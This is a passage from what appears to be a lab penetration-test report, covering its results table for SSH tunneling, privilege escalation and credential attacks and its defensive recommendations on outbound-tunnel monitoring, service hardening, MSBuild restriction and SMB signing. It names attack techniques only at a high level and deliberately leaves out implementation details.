| **SSH Tunneling** | Remote port forwarding | ✅ Successful | **Detection Gap** |
| **Local Privilege Escalation** | AlwaysInstallElevated, Unquoted Paths, Writable Binaries, UAC Bypass | 🔴 All Failed | GPO, File System ACLs, Least Privilege |
| **Credential Access** | Responder, SMB Relay | 🔴 Blocked | Protocol Hardening, SMB Signing |

---

## 📌 Defensive Recommendations (Phase 2)

### Critical Findings Requiring Attention

| Finding | Risk Level | Recommendation |
|---------|------------|----------------|
| **SSH Tunneling Undetected** | 🔴 High | Implement monitoring for abnormal outbound SSH connections, data volume anomalies, and connections to unusual destinations. |
| **SYSTEM Service Exposure** | 🟡 Medium | Audit all services running with SYSTEM privileges. Where possible, restrict to localhost or disable. |
| **Writable Temp Directory** | 🟡 Medium | While not directly exploitable, monitor for process creation from `C:\Windows\CCM\Temp`. |
| **MSBuild Execution** | 🟡 Medium | Consider restricting MSBuild for non-developers via AppLocker or WDAC. |

### General Hardening Recommendations

1. **Outbound Tunnel Detection:** Deploy network monitoring to detect unauthorized SSH tunnels. Look for SSH traffic to unusual destinations or at unusual times.

2. **Service Hardening:**
   - Inventory all SYSTEM-level services.
   - Disable unnecessary services (e.g., AMT web interface if not used).
   - For required services, ensure they are properly configured and patched.

3. **Writable Directory Monitoring:**
   - Monitor `C:\Windows\CCM\Temp` for unexpected process creation.
   - Consider removing write permissions if not required.

4. **MSBuild Restrictions:**
   - Use AppLocker or WDAC to allow MSBuild only for authorized users/processes.
   - Monitor MSBuild execution events.

5. **SMB Signing:** Continue enforcing SMB signing (already enabled).

6. **Least Privilege Review:**
   - Audit domain user privileges.
   - Remove unnecessary group memberships.

7. **EDR Tuning:**
   - Ensure EDR is configured to detect and alert on PowerShell usage, MSBuild execution, and abnormal outbound connections.

---

## 📎 Notes

- All IP addresses, hostnames, domain names, and usernames have been anonymized.
- Implementation details for certain techniques (e.g., reverse tunnel) are intentionally excluded to prevent misuse.
- This research was conducted in an isolated lab environment with explicit authorization.
- No actual corporate systems were harmed during this testing.

---

## 🔗 Back to Main

[⬅️ Return to Main Repository](../README.md)
